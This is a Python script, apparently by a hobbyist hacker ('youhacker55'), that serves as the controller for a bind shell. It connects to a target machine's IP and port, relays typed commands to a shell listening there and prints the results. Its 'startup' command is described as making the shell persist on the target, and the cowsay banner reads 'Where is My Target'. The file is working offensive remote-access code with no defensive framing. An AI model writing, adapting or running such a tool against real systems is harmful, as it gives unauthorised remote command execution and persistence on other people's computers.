import  socket
import  argparse
import os
from platform import system

def clear():
    clear = ""
    if system() == "Windows":
        clear = "cls"
    else:
        clear = "clear"
    return  clear
os.system(clear())

def banner():
    ban = """
 _______________
< Where is My Target >
 ---------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

 Bind_shell Made By youhacker55   
    """
    return ban
print(banner())
s = socket.socket()
parser = argparse.ArgumentParser()
parser.add_argument("ip",help="Ip address of bind_shell")
parser.add_argument("port",help="Port of bind_shell")
args = parser.parse_args()
if  args.port.isdigit() == False:
    print("[-] Port should be integer")
    exit()
# function bch tab3ath ay ammount mt3 data lel bind shell

def hezkolcay(sock):
    BUFF_SIZE = 4096
    data = b''
    while True:
        part = sock.recv(BUFF_SIZE)
        data += part
        if len(part) < BUFF_SIZE:
            break
    return data.decode()
def connecttoshell(ip,port):
    try:
        s.connect((ip, port))
    except:
        print("[-] Problems oonnecting to the target")
    else:
        while True:
            command = input("Bind_shell==>")
            if command == "exit":
                s.send("exit".encode())
                print("See you later :)")
                break
            elif command == "help":
                print("""
                exit ==> stop the bind_shell on your target
                startup ==> Persist  your Bind_shell
                clear ==> just clear the screen
                banner ==> show the banner again
                """)
            elif command == "clear":
                os.system(clear())

            elif command == "ls":
                print("[-] This is Windows Shell use dir -_-")
            elif command == "startup":
                s.send("startup".encode())
                print(s.recv(1024).decode())
            elif command.replace(" ","") == "":
                print("Type Something -_-")
            elif command == "banner":
                print(banner())

            else:
                s.send(command.encode())
                print(hezkolcay(s))

try:
    connecttoshell(args.ip,int(args.port))
except ConnectionError:
    print("[-] Lost Connection")
